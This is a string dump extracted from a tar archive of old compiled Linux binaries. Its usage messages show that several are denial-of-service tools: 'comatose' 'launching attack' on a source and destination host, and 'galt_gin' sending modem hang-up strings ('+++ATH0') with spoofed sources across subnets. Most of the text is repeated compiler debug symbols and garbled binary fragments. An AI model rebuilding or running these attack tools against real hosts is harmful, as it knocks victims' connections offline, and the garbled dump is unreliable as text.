            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "arnup100.c",
            "l.12",
            "s.16",
            "l.20",
            "getportudp",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "strcmp@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "getservbyname@@GLIBC_2.0",
            "putchar@@GLIBC_2.0",
            "stocp",
            "_init",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "setsockopt@@GLIBC_2.0",
            "cptol",
            "_start",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "getip",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "ltocp",
            "__gmon_start__",
            "datapool/bin/comatose",
            "0100755",
            "0000000",
            "0000000",
            "00000036464",
            "07100656574",
            "013717",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "ioctl",
            "geteuid",
            "memcpy",
            "perror",
            "getuid",
            "socket",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "chdir",
            "umask",
            "rand",
            "signal",
            "setpgrp",
            "sendto",
            "fork",
            "memset",
            "inet_ntoa",
            "gethostbyname",
            "stderr",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "open",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRht",
            "QVh<",
            "E}u@E",
            "U1fE",
            "fE1fU",
            "]UTSh",
            "M@eM",
            ")\u044bE)1fR",
            "fE\u0103h",
            "fEE@E",
            "fE\u0583j",
            "j0EPEP u,h\u048f",
            "j0EPEP~ u,h\u048f",
            "t\tt%%v",
            "#u$h",
            "t.t#h`",
            "}t\tG&",
            "EEEEP",
            "EEEPEPm",
            "/u#h",
            "E;Er",
            "EPEP",
            "E\u0603EPh",
            "\u0403;u[]",
            "socket allocation",
            "sendto",
            "daemonize(): fork()",
            "setpgrp",
            "/dev/tty",
            "ioctl",
            "Invalid usage.",
            "usage:\t%s src_host|ip dst_host|ip iterations",
            "Insufficient privileges (uid|euid == 0)",
            "Invalid host|ip: `%s`.",
            "DoS: (%s) -> ",
            "(%s) [%d]",
            "Cannot become daemon.",
            "Successfully daemonized, launching attack.",
            "Completed `%d` iterations.",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "comatose.c",
            "daemonize",
            "predator",
            "resolve_host",
            "setpgrp@@GLIBC_2.0",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "fork@@GLIBC_2.0",
            "umask@@GLIBC_2.0",
            "signal@@GLIBC_2.0",
            "inet_ntoa@@GLIBC_2.0",
            "_init",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "_start",
            "chdir@@GLIBC_2.0",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "getuid@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "open@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "ioctl@@GLIBC_2.0",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "rand@@GLIBC_2.0",
            "geteuid@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/galt_gin",
            "0100755",
            "0000000",
            "0000000",
            "00000040264",
            "07100656606",
            "013656",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "strcpy",
            "printf",
            "stdout",
            "getpid",
            "malloc",
            "optarg",
            "socket",
            "fflush",
            "strtol",
            "fprintf",
            "strcat",
            "inet_addr",
            "__deregister_frame_info",
            "optind",
            "rand",
            "sendto",
            "getopt",
            "memset",
            "srand",
            "time",
            "gethostbyname",
            "stderr",
            "htons",
            "__errno_location",
            "exit",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRhd",
            "UDSE",
            "fEfE",
            "EE\u0721\u0723",
            "\u0409Eu*h",
            "EE\u050bM",
            "E\u0303EPj",
            "@E\u0500 ",
            "1fEPW",
            "1fR6",
            "E\u050bUP",
            "E\u050bUP",
            "U\u0609Pj",
            "EPEPEP u",
            "E\u050bU\u050bJ",
            "U\u0609Pj",
            "EPEPEP",
            "E}uVE",
            "E1fE",
            "fE1fu",
            "e[^]",
            "Ov(jPh ",
            "Ov%jPh`",
            ":\"u h",
            "Mv%jPh ",
            "\u0403;u[]",
            "couldnt open raw socket",
            "couldnt malloc packet",
            "+++ATH0",
            "sendto failed",
            "done",
            "I can't resolve \"%s\"",
            "source can only be %d characters",
            "command can only be %d characters",
            "bogus delay value (using default)",
            "usage: gin [-S <source host>] [-s] [-m <command] [-d <delay>] <dest>",
            "\t -S specfies a source host (defaults to random)",
            "\t -s turns on subnet mode, dest is interpreted as a class c (1.2.3)",
            "\t -m adds another modem command after the hang up",
            "\t -d delay in ms between sent packets",
            "S:shm:d:",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
